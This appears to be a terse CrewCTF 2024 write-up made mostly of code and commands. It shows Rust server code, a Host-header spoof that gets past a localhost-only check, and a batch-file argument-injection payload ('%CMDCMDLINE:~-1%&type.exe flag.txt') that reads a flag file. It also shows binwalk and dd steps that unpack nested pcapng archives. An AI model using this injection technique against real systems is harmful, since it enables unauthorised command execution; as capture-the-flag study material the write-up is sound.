# CrewCTF 2024 Writeup

> 原文: https://www.ctfiot.com/197698.html
> ID: 197698


```
async fn middleware_localhost<E: Endpoint>(next: E, req: Request) -> Result<Response> {
 // No authentication? -T // "I [too] like to live dangerously." -V
 if let Some(host) = req.uri().host().or(req.header("host")) {
 if !host.trim_start().starts_with("127.0.0.1") {
 return Err(Error::
from_status(StatusCode::
UNAUTHORIZED));
 }
 } else {
 return Err(Error::
from_status(StatusCode::
UNAUTHORIZED));
 }

 let resp = next.call(req).await?.into_response();
 Ok(resp)
}
GET /ai/run?cmd=env&arg= HTTP/1.1
Host: 127.0.0.1

→

…
CARGO: \\?\C:\Users\ctf\.rustup\toolchains\1.76-x86_64-pc-windows-msvc\bin\cargo.exe
…
"ping2" => {
 if arg.contains(['\'', '"', '*', '!', '@', '^', '?']) {
 return Err("bad chars found".to_string());
 }
 let routput = Command::
new(".\\scripts\\ping.bat")
 .arg(arg)
 .output();

 if let Err(_e) = routput {
 return Err("failed to run ping2 output".to_string());
 }

 Ok(String::
from_utf8_lossy(&routput.unwrap().stdout).to_string())
}
GET /ai/run?cmd=ping2&arg=%25CMDCMDLINE%3a~-1%25%26type.exe%20flag.txt HTTP/1.1
Host: 127.0.0.1

→

HTTP/1.1 200 OK
…

Network checking finished!
crew{■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■}
$ binwalk -e usb.pcapng

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
13811 0x35F3 gzip compressed data, maximum compression, has original file name: "layer4.pcapng", from FAT filesystem (MS-DOS, OS/2, NT), last modified: 2024-04-06 09:43:23
$ binwalk -e layer4.pcapng

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
14095 0x370F 7-zip archive data, version 0.4

$ dd ibs=1 obs=1 skip=14095 if=layer4.pcapng of=out.7z
$ binwalk -e layer3.pcapng

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
13527 0x34D7 POSIX tar archive (GNU), owner user name: "capng"

$ binwalk -e layer2.pcapng

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
22811 0x591B Zip archive data, at least v2.0 to extract, compressed size: 3048, uncompressed size: 54768, name: layer1.pcapng
25961 0x6569 End of Zip archive, footer length: 22

$ binwalk -e layer1.pcapng

DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------

$ strings layer1.pcapng | grep crew
crew{■■■■■■■■■■■■■■■■■■}
```
